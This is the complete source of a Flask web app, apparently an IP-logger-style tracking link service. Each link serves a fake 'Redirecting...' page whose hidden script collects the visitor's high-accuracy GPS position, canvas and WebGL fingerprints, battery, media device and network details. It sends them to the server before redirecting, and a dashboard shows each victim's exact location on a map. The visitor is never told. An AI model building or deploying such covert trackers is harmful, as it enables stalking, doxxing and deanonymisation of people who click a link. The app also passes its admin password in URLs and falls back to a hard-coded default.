from flask import Flask, request, redirect, render_template_string, jsonify
from datetime import datetime
import json
import os
import hashlib
import urllib.request

app = Flask(__name__)

LOG_FILE = "clicks.json"

def load_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            return json.load(f)
    return []

def save_log(entry):
    logs = load_logs()
    logs.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=2)

ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "changeme123")

def get_ip_location(ip):
    try:
        real_ip = ip.split(",")[0].strip()
        url = f"http://ip-api.com/json/{real_ip}?fields=status,country,regionName,city,isp,lat,lon,org,as,query"
        req = urllib.request.Request(url, headers={"User-Agent": "LinkTracker/1.0"})
        with urllib.request.urlopen(req, timeout=3) as resp:
            data = json.loads(resp.read().decode())
            if data.get("status") == "success":
                return {
                    "city": data.get("city", "Unknown"),
                    "region": data.get("regionName", ""),
                    "country": data.get("country", "Unknown"),
                    "isp": data.get("isp", "Unknown"),
                    "org": data.get("org", ""),
                    "as_number": data.get("as", ""),
                    "real_ip": data.get("query", real_ip),
                    "ip_lat": data.get("lat", ""),
                    "ip_lon": data.get("lon", ""),
                }
    except:
        pass
    return {"city": "Unknown", "region": "", "country": "Unknown", "isp": "Unknown", "org": "", "as_number": "", "real_ip": ip.split(",")[0].strip(), "ip_lat": "", "ip_lon": ""}

def parse_user_agent(ua):
    device = "Unknown"
    os_name = "Unknown"
    browser = "Unknown"
    os_version = ""

    if "iPhone" in ua:
        device = "iPhone"
        os_name = "iOS"
        try:
            idx = ua.index("OS ")
            ver = ua[idx+3:].split(" ")[0].replace("_", ".")
            os_version = ver
        except: pass
    elif "iPad" in ua:
        device = "iPad"
        os_name = "iOS"
        try:
            idx = ua.index("OS ")
            ver = ua[idx+3:].split(" ")[0].replace("_", ".")
            os_version = ver
        except: pass
    elif "Android" in ua:
        os_name = "Android"
        try:
            idx = ua.index("Android ")
            ver = ua[idx+8:].split(";")[0].split(")")[0].strip()
            os_version = ver
        except: pass
        try:
            start = ua.index("Android")
            segment = ua[start:]
            if ";" in segment:
                parts = segment.split(";")
                if len(parts) > 1:
                    model = parts[1].strip()
                    if "Build" in model:
                        model = model[:model.index("Build")].strip()
                    if ")" in model:
                        model = model[:model.index(")")].strip()
                    device = model if model else "Android Device"
                else:
                    device = "Android Device"
            else:
                device = "Android Device"
        except:
            device = "Android Device"
    elif "Windows" in ua:
        device = "PC"
        os_name = "Windows"
        if "Windows NT 10.0" in ua:
            os_name = "Windows"
            os_version = "10/11"
        elif "Windows NT 6.3" in ua:
            os_name = "Windows"
            os_version = "8.1"
        elif "Windows NT 6.1" in ua:
            os_name = "Windows"
            os_version = "7"
    elif "Macintosh" in ua:
        device = "Mac"
        os_name = "macOS"
        try:
            idx = ua.index("Mac OS X ")
            ver = ua[idx+9:].split(")")[0].split(";")[0].replace("_", ".")
            os_version = ver
        except: pass
    elif "Linux" in ua:
        device = "PC"
        os_name = "Linux"

    browser_version = ""
    if "Edg/" in ua:
        browser = "Edge"
        try: browser_version = ua.split("Edg/")[1].split(" ")[0]
        except: pass
    elif "Chrome/" in ua and "Safari/" in ua:
        browser = "Chrome"
        try: browser_version = ua.split("Chrome/")[1].split(" ")[0]
        except: pass
    elif "Firefox/" in ua:
        browser = "Firefox"
        try: browser_version = ua.split("Firefox/")[1].split(" ")[0]
        except: pass
    elif "Safari/" in ua:
        browser = "Safari"
        try: browser_version = ua.split("Version/")[1].split(" ")[0]
        except: pass
    elif "Opera" in ua or "OPR/" in ua:
        browser = "Opera"

    return device, os_name, os_version, browser, browser_version


# ---- TRACKING PAGE (collects max JS data + GPS) ----
TRACKER_PAGE = """
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Redirecting...</title>
<style>
    body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
    .loader { text-align: center; color: #666; }
    .spinner { border: 3px solid #eee; border-top: 3px solid #333; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.8s linear infinite; margin: 0 auto 15px; }
    @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="loader">
    <div class="spinner"></div>
    <p>Loading, please wait...</p>
</div>
<script>
async function collect() {
    const data = {
        link_id: "{{ link_id }}",

        // ---- SCREEN & DISPLAY ----
        screen_width: screen.width,
        screen_height: screen.height,
        screen_avail_w: screen.availWidth,
        screen_avail_h: screen.availHeight,
        viewport_width: window.innerWidth,
        viewport_height: window.innerHeight,
        color_depth: screen.colorDepth,
        pixel_ratio: window.devicePixelRatio || 1,
        orientation: (screen.orientation && screen.orientation.type) || 'unknown',
        dark_mode: window.matchMedia('(prefers-color-scheme: dark)').matches,

        // ---- SYSTEM / HARDWARE ----
        platform: navigator.platform || '',
        cpu_cores: navigator.hardwareConcurrency || 'unknown',
        device_memory: navigator.deviceMemory || 'unknown',
        max_touch_points: navigator.maxTouchPoints || 0,
        touch_support: ('ontouchstart' in window) || (navigator.maxTouchPoints > 0),

        // ---- NETWORK ----
        connection_type: 'unknown',
        connection_downlink: 'unknown',
        connection_rtt: 'unknown',
        connection_save_data: false,

        // ---- LOCALE & TIME ----
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezone_offset: new Date().getTimezoneOffset(),
        language: navigator.language,
        languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,

        // ---- BROWSER FEATURES ----
        cookies_enabled: navigator.cookieEnabled,
        do_not_track: navigator.doNotTrack || 'unset',
        pdf_viewer: navigator.pdfViewerEnabled || false,
        webgl_vendor: '',
        webgl_renderer: '',
        canvas_fingerprint: '',

        // ---- MEDIA DEVICES ----
        camera_count: 0,
        mic_count: 0,
        speaker_count: 0,

        // ---- GPS ----
        gps_lat: null,
        gps_lon: null,
        gps_accuracy: null,
        gps_altitude: null,
        gps_speed: null,

        // ---- BATTERY ----
        battery_level: null,
        battery_charging: null,

        // ---- STORAGE ----
        storage_quota: 'unknown',
    };

    // Network details
    try {
        if (navigator.connection) {
            data.connection_type = navigator.connection.effectiveType || 'unknown';
            data.connection_downlink = navigator.connection.downlink || 'unknown';
            data.connection_rtt = navigator.connection.rtt || 'unknown';
            data.connection_save_data = navigator.connection.saveData || false;
        }
    } catch(e) {}

    // WebGL GPU info
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                data.webgl_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                data.webgl_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
        }
    } catch(e) {}

    // Canvas fingerprint (unique device hash)
    try {
        const canvas = document.createElement('canvas');
        canvas.width = 200; canvas.height = 50;
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125,1,62,20);
        ctx.fillStyle = '#069';
        ctx.fillText('fingerprint', 2, 15);
        ctx.fillStyle = 'rgba(102,204,0,0.7)';
        ctx.fillText('fingerprint', 4, 17);
        const dataUrl = canvas.toDataURL();
        // Simple hash
        let hash = 0;
        for (let i = 0; i < dataUrl.length; i++) {
            const char = dataUrl.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        data.canvas_fingerprint = Math.abs(hash).toString(16);
    } catch(e) {}

    // Media devices (cameras, mics, speakers)
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
            const devices = await navigator.mediaDevices.enumerateDevices();
            data.camera_count = devices.filter(d => d.kind === 'videoinput').length;
            data.mic_count = devices.filter(d => d.kind === 'audioinput').length;
            data.speaker_count = devices.filter(d => d.kind === 'audiooutput').length;
        }
    } catch(e) {}

    // GPS location (high accuracy)
    try {
        const pos = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0
            });
        });
        data.gps_lat = pos.coords.latitude;
        data.gps_lon = pos.coords.longitude;
        data.gps_accuracy = pos.coords.accuracy;
        data.gps_altitude = pos.coords.altitude;
        data.gps_speed = pos.coords.speed;
    } catch(e) {}

    // Battery
    try {
        if (navigator.getBattery) {
            const batt = await navigator.getBattery();
            data.battery_level = Math.round(batt.level * 100);
            data.battery_charging = batt.charging;
        }
    } catch(e) {}

    // Storage quota
    try {
        if (navigator.storage && navigator.storage.estimate) {
            const est = await navigator.storage.estimate();
            data.storage_quota = Math.round((est.quota || 0) / (1024*1024*1024) * 100) / 100;
        }
    } catch(e) {}

    // Send to server
    try {
        await fetch('/collect', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        });
    } catch(e) {}

    window.location.href = "{{ target_url }}";
}

collect();
setTimeout(() => { window.location.href = "{{ target_url }}"; }, 8000);
</script>
</body>
</html>
"""


@app.route("/t/<link_id>")
def track(link_id):
    links = load_links()
    target = links.get(link_id)
    if not target:
        return "Link not found", 404

    ua = request.headers.get("User-Agent", "")
    device, os_name, os_version, browser, browser_version = parse_user_agent(ua)
    raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    location = get_ip_location(raw_ip)

    entry = {
        "link_id": link_id,
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "ip": location["real_ip"],
        "user_agent": ua,
        "device": device,
        "os": os_name,
        "os_version": os_version,
        "browser": browser,
        "browser_version": browser_version,
        "referrer": request.headers.get("Referer", "Direct"),
        # Location
        "city": location["city"],
        "region": location["region"],
        "country": location["country"],
        "isp": location["isp"],
        "network_org": location.get("org", ""),
        "as_number": location.get("as_number", ""),
        "ip_lat": location.get("ip_lat", ""),
        "ip_lon": location.get("ip_lon", ""),
        # JS fields (filled by /collect)
        "js_collected": False,
    }

    save_log(entry)
    return render_template_string(TRACKER_PAGE, link_id=link_id, target_url=target)


@app.route("/collect", methods=["POST"])
def collect():
    try:
        data = request.get_json(force=True)
        link_id = data.get("link_id", "")

        logs = load_logs()
        for log in reversed(logs):
            if log.get("link_id") == link_id and not log.get("js_collected"):
                log["js_collected"] = True

                # Screen & Display
                log["screen"] = f"{data.get('screen_width','?')}x{data.get('screen_height','?')}"
                log["screen_available"] = f"{data.get('screen_avail_w','?')}x{data.get('screen_avail_h','?')}"
                log["viewport"] = f"{data.get('viewport_width','?')}x{data.get('viewport_height','?')}"
                log["pixel_ratio"] = str(data.get("pixel_ratio", ""))
                log["color_depth"] = str(data.get("color_depth", ""))
                log["orientation"] = data.get("orientation", "")
                log["dark_mode"] = data.get("dark_mode", False)

                # Hardware
                log["platform"] = data.get("platform", "")
                log["cpu_cores"] = str(data.get("cpu_cores", ""))
                dm = data.get("device_memory")
                log["device_memory"] = f"{dm} GB" if dm and dm != "unknown" else ""
                log["max_touch_points"] = str(data.get("max_touch_points", ""))
                log["touch_support"] = data.get("touch_support", False)
                log["gpu_vendor"] = data.get("webgl_vendor", "")
                log["gpu_renderer"] = data.get("webgl_renderer", "")
                log["canvas_fingerprint"] = data.get("canvas_fingerprint", "")

                # Storage
                sq = data.get("storage_quota")
                log["storage_quota"] = f"{sq} GB" if sq and sq != "unknown" else ""

                # Network
                log["connection_type"] = data.get("connection_type", "")
                dl = data.get("connection_downlink")
                log["connection_speed"] = f"{dl} Mbps" if dl and dl != "unknown" else ""
                rtt = data.get("connection_rtt")
                log["connection_latency"] = f"{rtt} ms" if rtt and rtt != "unknown" else ""
                log["save_data"] = data.get("connection_save_data", False)

                # Locale
                log["timezone"] = data.get("timezone", "")
                log["language"] = data.get("language", "")
                log["languages"] = data.get("languages", "")

                # Browser features
                log["cookies_enabled"] = data.get("cookies_enabled", True)
                log["do_not_track"] = str(data.get("do_not_track", ""))
                log["pdf_viewer"] = data.get("pdf_viewer", False)

                # Media devices
                log["cameras"] = data.get("camera_count", 0)
                log["mics"] = data.get("mic_count", 0)
                log["speakers"] = data.get("speaker_count", 0)

                # Battery
                if data.get("battery_level") is not None:
                    charging = "Charging" if data.get("battery_charging") else "Not charging"
                    log["battery"] = f"{data['battery_level']}% ({charging})"

                # GPS
                if data.get("gps_lat") is not None:
                    log["gps_lat"] = data["gps_lat"]
                    log["gps_lon"] = data["gps_lon"]
                    log["gps_accuracy"] = f"{round(data.get('gps_accuracy', 0), 1)}m"
                    if data.get("gps_altitude") is not None:
                        log["gps_altitude"] = f"{round(data['gps_altitude'], 1)}m"
                    if data.get("gps_speed") is not None:
                        log["gps_speed"] = f"{round(data['gps_speed'], 1)} m/s"

                break

        with open(LOG_FILE, "w") as f:
            json.dump(logs, f, indent=2)
    except:
        pass
    return jsonify({"ok": True})


LINKS_FILE = "links.json"

def load_links():
    if os.path.exists(LINKS_FILE):
        with open(LINKS_FILE, "r") as f:
            return json.load(f)
    return {}

def save_links(links):
    with open(LINKS_FILE, "w") as f:
        json.dump(links, f, indent=2)


# ---- DASHBOARD ----
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Link Tracker Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0f172a; color: #e2e8f0; padding: 16px; }
        h1 { color: #38bdf8; margin-bottom: 16px; font-size: 1.5em; }
        h2 { color: #94a3b8; margin: 16px 0 8px; font-size: 1em; }
        h3 { color: #cbd5e1; font-size: 0.85em; margin: 10px 0 6px; text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid #334155; padding-bottom: 4px; }

        .stats { display: flex; gap: 12px; margin-bottom: 20px; flex-wrap: wrap; }
        .stat-card { background: #1e293b; padding: 12px 16px; border-radius: 10px; min-width: 100px; }
        .stat-card .number { font-size: 1.8em; font-weight: bold; color: #38bdf8; }
        .stat-card .label { color: #94a3b8; font-size: 0.8em; }

        .section { background: #1e293b; border-radius: 10px; padding: 16px; margin-bottom: 16px; }
        .form-row { display: flex; gap: 8px; margin-bottom: 12px; flex-wrap: wrap; }
        input[type="text"] { background: #0f172a; border: 1px solid #334155; color: #e2e8f0; padding: 10px 12px; border-radius: 8px; flex: 1; min-width: 180px; }
        button { background: #38bdf8; color: #0f172a; border: none; padding: 10px 16px; border-radius: 8px; cursor: pointer; font-weight: 600; }
        button:hover { background: #7dd3fc; }

        .link-item { background: #0f172a; padding: 10px; border-radius: 8px; margin-bottom: 6px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 6px; }
        .link-url { color: #38bdf8; word-break: break-all; font-size: 0.85em; }
        .link-target { color: #64748b; font-size: 0.75em; word-break: break-all; }
        .copy-btn { background: #334155; color: #e2e8f0; padding: 4px 10px; border-radius: 5px; font-size: 0.75em; cursor: pointer; border: none; }

        .click-card { background: #0f172a; border-radius: 10px; padding: 14px; margin-bottom: 10px; border-left: 3px solid #38bdf8; }
        .click-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; flex-wrap: wrap; gap: 6px; }
        .click-time { color: #94a3b8; font-size: 0.8em; }
        .click-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 6px; }
        .click-field .label { color: #64748b; font-size: 0.7em; text-transform: uppercase; letter-spacing: 0.5px; }
        .click-field .value { color: #e2e8f0; font-size: 0.85em; margin-top: 1px; word-break: break-word; }

        .tag { background: #334155; padding: 2px 6px; border-radius: 4px; font-size: 0.75em; display: inline-block; }
        .tag-blue { background: #1e3a5f; color: #7dd3fc; }
        .tag-green { background: #1a2e1a; color: #86efac; }
        .tag-orange { background: #3d2800; color: #fbbf24; }
        .tag-red { background: #3d0000; color: #fca5a5; }
        .tag-purple { background: #2d1a4e; color: #c4b5fd; }

        .gps-link { color: #38bdf8; text-decoration: none; font-size: 0.8em; }
        .gps-link:hover { text-decoration: underline; }
        .empty { color: #64748b; text-align: center; padding: 30px; }

        .section-divider { border: none; border-top: 1px solid #1e293b; margin: 8px 0; }

        @media (max-width: 600px) {
            .click-grid { grid-template-columns: 1fr 1fr; }
            body { padding: 10px; }
        }
    </style>
</head>
<body>
    <h1>🔗 Link Tracker</h1>

    <div class="stats">
        <div class="stat-card"><div class="number">{{ total_clicks }}</div><div class="label">Total Clicks</div></div>
        <div class="stat-card"><div class="number">{{ unique_ips }}</div><div class="label">Unique Visitors</div></div>
        <div class="stat-card"><div class="number">{{ total_links }}</div><div class="label">Active Links</div></div>
    </div>

    <div class="section">
        <h2>Create Tracking Link</h2>
        <form method="POST" action="/dashboard/create">
            <div class="form-row">
                <input type="text" name="url" placeholder="Paste destination URL" required>
                <input type="text" name="slug" placeholder="Custom slug (optional)">
                <button type="submit">Create</button>
            </div>
        </form>
    </div>

    {% if links %}
    <div class="section">
        <h2>Your Links</h2>
        {% for slug, target in links.items() %}
        <div class="link-item">
            <div>
                <div class="link-url">{{ base_url }}/t/{{ slug }}</div>
                <div class="link-target">→ {{ target }}</div>
            </div>
            <button class="copy-btn" onclick="navigator.clipboard.writeText('{{ base_url }}/t/{{ slug }}')">Copy</button>
        </div>
        {% endfor %}
    </div>
    {% endif %}

    <div class="section">
        <h2>Recent Clicks</h2>
        {% if logs %}
        {% for log in logs|reverse %}
        <div class="click-card">
            <div class="click-header">
                <div>
                    <span class="tag">{{ log.link_id }}</span>
                    <span class="click-time">{{ log.timestamp[:19] }} UTC</span>
                </div>
                {% if log.get('gps_lat') and log.gps_lat != '' %}
                <a class="gps-link" href="https://www.google.com/maps?q={{ log.gps_lat }},{{ log.gps_lon }}" target="_blank">📍 EXACT Location (±{{ log.gps_accuracy }})</a>
                {% elif log.get('ip_lat') and log.ip_lat != '' %}
                <a class="gps-link" href="https://www.google.com/maps?q={{ log.ip_lat }},{{ log.ip_lon }}" target="_blank">📍 Approx Location (IP)</a>
                {% endif %}
            </div>

            <!-- LOCATION & NETWORK -->
            <h3>📍 Location & Network</h3>
            <div class="click-grid">
                <div class="click-field"><div class="label">IP Address</div><div class="value">{{ log.ip }}</div></div>
                <div class="click-field"><div class="label">Location</div><div class="value"><span class="tag tag-blue">{{ log.get('city','N/A') }}{% if log.get('region') %}, {{ log.region }}{% endif %}, {{ log.get('country','') }}</span></div></div>
                <div class="click-field"><div class="label">ISP</div><div class="value"><span class="tag tag-green">{{ log.get('isp','N/A') }}</span></div></div>
                {% if log.get('network_org') %}<div class="click-field"><div class="label">Network Org</div><div class="value">{{ log.network_org }}</div></div>{% endif %}
                {% if log.get('as_number') %}<div class="click-field"><div class="label">AS Number</div><div class="value">{{ log.as_number }}</div></div>{% endif %}
                {% if log.get('timezone') %}<div class="click-field"><div class="label">Timezone</div><div class="value">{{ log.timezone }}</div></div>{% endif %}
                {% if log.get('connection_type') %}<div class="click-field"><div class="label">Connection</div><div class="value"><span class="tag tag-orange">{{ log.connection_type }}</span></div></div>{% endif %}
                {% if log.get('connection_speed') %}<div class="click-field"><div class="label">Speed</div><div class="value">{{ log.connection_speed }}</div></div>{% endif %}
                {% if log.get('connection_latency') %}<div class="click-field"><div class="label">Latency</div><div class="value">{{ log.connection_latency }}</div></div>{% endif %}
            </div>

            <hr class="section-divider">

            <!-- DEVICE & HARDWARE -->
            <h3>📱 Device & Hardware</h3>
            <div class="click-grid">
                <div class="click-field"><div class="label">Device</div><div class="value"><strong>{{ log.device }}</strong></div></div>
                <div class="click-field"><div class="label">OS</div><div class="value">{{ log.os }}{% if log.get('os_version') %} {{ log.os_version }}{% endif %}</div></div>
                <div class="click-field"><div class="label">Browser</div><div class="value">{{ log.browser }}{% if log.get('browser_version') %} {{ log.browser_version }}{% endif %}</div></div>
                {% if log.get('cpu_cores') %}<div class="click-field"><div class="label">CPU Cores</div><div class="value">{{ log.cpu_cores }}</div></div>{% endif %}
                {% if log.get('device_memory') %}<div class="click-field"><div class="label">RAM</div><div class="value">{{ log.device_memory }}</div></div>{% endif %}
                {% if log.get('gpu_renderer') %}<div class="click-field"><div class="label">GPU</div><div class="value"><span class="tag tag-purple">{{ log.gpu_renderer }}</span></div></div>{% endif %}
                {% if log.get('gpu_vendor') %}<div class="click-field"><div class="label">GPU Vendor</div><div class="value">{{ log.gpu_vendor }}</div></div>{% endif %}
                {% if log.get('storage_quota') %}<div class="click-field"><div class="label">Storage</div><div class="value">{{ log.storage_quota }}</div></div>{% endif %}
                {% if log.get('platform') %}<div class="click-field"><div class="label">Platform</div><div class="value">{{ log.platform }}</div></div>{% endif %}
                {% if log.get('max_touch_points') and log.max_touch_points != '0' %}<div class="click-field"><div class="label">Touch Points</div><div class="value">{{ log.max_touch_points }}</div></div>{% endif %}
            </div>

            <hr class="section-divider">

            <!-- SCREEN & DISPLAY -->
            <h3>🖥️ Screen & Display</h3>
            <div class="click-grid">
                {% if log.get('screen') %}<div class="click-field"><div class="label">Screen Resolution</div><div class="value">{{ log.screen }}</div></div>{% endif %}
                {% if log.get('viewport') %}<div class="click-field"><div class="label">Viewport</div><div class="value">{{ log.viewport }}</div></div>{% endif %}
                {% if log.get('pixel_ratio') %}<div class="click-field"><div class="label">Pixel Ratio</div><div class="value">{{ log.pixel_ratio }}x</div></div>{% endif %}
                {% if log.get('color_depth') %}<div class="click-field"><div class="label">Color Depth</div><div class="value">{{ log.color_depth }}-bit</div></div>{% endif %}
                {% if log.get('orientation') %}<div class="click-field"><div class="label">Orientation</div><div class="value">{{ log.orientation }}</div></div>{% endif %}
                {% if log.get('dark_mode') is not none %}<div class="click-field"><div class="label">Dark Mode</div><div class="value">{{ 'Yes' if log.get('dark_mode') else 'No' }}</div></div>{% endif %}
            </div>

            <hr class="section-divider">

            <!-- MEDIA & SENSORS -->
            <h3>🔋 Battery, Media & Fingerprint</h3>
            <div class="click-grid">
                {% if log.get('battery') %}<div class="click-field"><div class="label">Battery</div><div class="value"><span class="tag tag-orange">{{ log.battery }}</span></div></div>{% endif %}
                {% if log.get('cameras') %}<div class="click-field"><div class="label">Cameras</div><div class="value">{{ log.cameras }}</div></div>{% endif %}
                {% if log.get('mics') %}<div class="click-field"><div class="label">Microphones</div><div class="value">{{ log.mics }}</div></div>{% endif %}
                {% if log.get('speakers') %}<div class="click-field"><div class="label">Speakers</div><div class="value">{{ log.speakers }}</div></div>{% endif %}
                {% if log.get('canvas_fingerprint') %}<div class="click-field"><div class="label">Device Fingerprint</div><div class="value"><span class="tag tag-red">{{ log.canvas_fingerprint }}</span></div></div>{% endif %}
                {% if log.get('language') %}<div class="click-field"><div class="label">Language</div><div class="value">{{ log.language }}</div></div>{% endif %}
                {% if log.get('languages') %}<div class="click-field"><div class="label">All Languages</div><div class="value">{{ log.languages }}</div></div>{% endif %}
                {% if log.get('do_not_track') %}<div class="click-field"><div class="label">Do Not Track</div><div class="value">{{ log.do_not_track }}</div></div>{% endif %}
                {% if log.get('cookies_enabled') is not none %}<div class="click-field"><div class="label">Cookies</div><div class="value">{{ 'Enabled' if log.get('cookies_enabled') else 'Disabled' }}</div></div>{% endif %}
            </div>

            {% if log.get('gps_lat') and log.gps_lat != '' %}
            <hr class="section-divider">
            <h3>🛰️ GPS Data</h3>
            <div class="click-grid">
                <div class="click-field"><div class="label">Latitude</div><div class="value">{{ log.gps_lat }}</div></div>
                <div class="click-field"><div class="label">Longitude</div><div class="value">{{ log.gps_lon }}</div></div>
                <div class="click-field"><div class="label">Accuracy</div><div class="value">{{ log.gps_accuracy }}</div></div>
                {% if log.get('gps_altitude') %}<div class="click-field"><div class="label">Altitude</div><div class="value">{{ log.gps_altitude }}</div></div>{% endif %}
                {% if log.get('gps_speed') %}<div class="click-field"><div class="label">Speed</div><div class="value">{{ log.gps_speed }}</div></div>{% endif %}
            </div>
            {% endif %}
        </div>
        {% endfor %}
        {% else %}
        <div class="empty">No clicks yet. Share a link to start tracking!</div>
        {% endif %}
    </div>
</body>
</html>
"""

@app.route("/dashboard")
def dashboard():
    pw = request.args.get("pw", "")
    if pw != ADMIN_PASSWORD:
        return render_template_string("""
        <!DOCTYPE html><html><head><title>Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { font-family: sans-serif; background: #0f172a; color: #e2e8f0; display: flex; justify-content: center; align-items: center; height: 100vh; }
            form { background: #1e293b; padding: 30px; border-radius: 12px; }
            input { background: #0f172a; border: 1px solid #334155; color: #e2e8f0; padding: 10px; border-radius: 8px; width: 100%; margin: 10px 0; }
            button { background: #38bdf8; color: #0f172a; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: 600; }
        </style></head><body>
        <form method="GET" action="/dashboard">
            <h2>🔒 Dashboard Login</h2>
            <input type="password" name="pw" placeholder="Enter password">
            <button type="submit">Enter</button>
        </form></body></html>
        """)

    logs = load_logs()
    links = load_links()
    unique_ips = len(set(l.get("ip", "") for l in logs))
    base_url = request.host_url.rstrip("/")

    return render_template_string(DASHBOARD_HTML,
        logs=logs, links=links,
        total_clicks=len(logs), unique_ips=unique_ips,
        total_links=len(links), base_url=base_url
    )


@app.route("/dashboard/create", methods=["POST"])
def create_link():
    url = request.form.get("url", "").strip()
    slug = request.form.get("slug", "").strip()
    if not url:
        return redirect(f"/dashboard?pw={ADMIN_PASSWORD}")
    if not slug:
        slug = hashlib.md5(url.encode()).hexdigest()[:6]
    links = load_links()
    links[slug] = url
    save_links(links)
    return redirect(f"/dashboard?pw={ADMIN_PASSWORD}")


@app.route("/")
def home():
    return redirect("/dashboard")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
